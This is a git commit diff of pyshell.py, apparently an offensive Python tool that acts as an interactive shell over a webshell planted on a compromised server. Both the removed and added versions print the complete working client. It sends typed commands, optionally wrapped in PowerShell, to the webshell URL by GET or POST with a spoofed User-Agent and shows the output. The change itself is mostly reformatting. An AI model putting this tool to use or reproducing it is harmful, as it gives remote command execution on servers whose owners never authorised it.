318a335511b2193d3fb7fb055fbd6644dac806c6
Joel GM <34335312+JoelGMSec@users.noreply.github.com>
2021-10-19 17:00:53 +0200

    Update pyshell.py

--- pyshell.py
+++ pyshell.py
@@ -5,19 +5,17 @@ import readline
 import argparse
 from termcolor import colored
 
-
 def send_command(command, webshell, method, param="code"):
-    headers = {"User-Agent":"Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0"}
-    params = {param.strip():command.strip()}
-    if (method.upper() == "GET"):
-        response = requests.get((webshell), params=params, headers=headers)
-    elif (method.upper() == "POST"):
-        response = requests.post((webshell), data=params, headers=headers)
-    return response.content.decode(errors='ignore')
-
+   headers = {"User-Agent":"Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0"}
+   params = {param.strip():command.strip()}
+   if (method.upper() == "GET"):
+      response = requests.get((webshell), params=params, headers=headers)
+   elif (method.upper() == "POST"):
+      response = requests.post((webshell), data=params, headers=headers)
+   return response.content.decode(errors='ignore')
 
 if __name__ == "__main__":
-    banner = """
+ banner = """
   ██▓███ ▓██   ██▓  ██████  ██░ ██ ▓█████  ██▓     ██▓    
  ▓██░  ██▒▒██  ██▒▒██    ▒ ▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒    
  ▓██░ ██▓▒ ▒██ ██░░ ▓██▄   ▒██▀▀██░▒███   ▒██░    ▒██░    
@@ -32,35 +30,36 @@ if __name__ == "__main__":
 
  """
 
-    print (colored(banner, 'green'))
-    parser = argparse.ArgumentParser(description='Pyshell')
-    parser.add_argument('url', help='Webshell URL', type=str)
-    parser.add_argument('method', help='HTTP Method to execute command (GET or POST)', type=str)
-    parser.add_argument('--ps', default=False, action="store_true", help='Powershell shell (Only Windows)')
-    parser.add_argument('-p', '--param', default="code", help='Parameter to use when you find custom webshell', type=str)
-    args = parser.parse_args()
+print (colored(banner, 'green'))
+parser = argparse.ArgumentParser()
+parser.add_argument('url', help='Webshell URL', type=str)
+parser.add_argument('method', help='HTTP Method to execute command (GET or POST)', type=str)
+parser.add_argument('--ps', default=False, action="store_true", help='PowerShell command execution (Only on Windows hosts)')
+parser.add_argument('-p', '--param', default="code", help='Parameter to use with custom WebShell', type=str)
+args = parser.parse_args()
 
-    try:
-        WEBSHELL = args.url
-        HTTP_METHOD = args.method
-        PARAM = args.param
+try:
+    WEBSHELL = args.url
+    HTTP_METHOD = args.method
+    PARAM = args.param
 
-        while True:
-            try:
-                command = input(colored("PyShell $> ", "green"))
-                if command == "exit":
-                    print (colored("\nExiting..\n", "red"))
-                    break
-                else:
-                    if args.ps:
-                        result = send_command("powershell " + command, WEBSHELL, HTTP_METHOD, PARAM)
-                        print (colored(result, "yellow"))
-                    else:
-                        result = send_command(command, WEBSHELL, HTTP_METHOD, PARAM)
-                        print (colored(result, "yellow"))
+    while True:
+       try:
+          command = input(colored("PyShell $> ", "green"))
+          if command == "exit":
+             print (colored("Exiting..\n", "red"))
+             break
+          else:
+             if args.ps:
+                result = send_command("powershell " + command, WEBSHELL, HTTP_METHOD, PARAM)
+                print (colored(result, "yellow"))
+             else:
+                result = send_command(command, WEBSHELL, HTTP_METHOD, PARAM)
+                print (colored(result, "yellow"))
 
-            except KeyboardInterrupt:
-                print (colored("\nExiting..\n", "red"))
-                break
-    except Exception as e:
-        print(e)
+       except KeyboardInterrupt:
+          print (colored("\nExiting..\n", "red"))
+          break
+
+except Exception as e:
+   print(e)
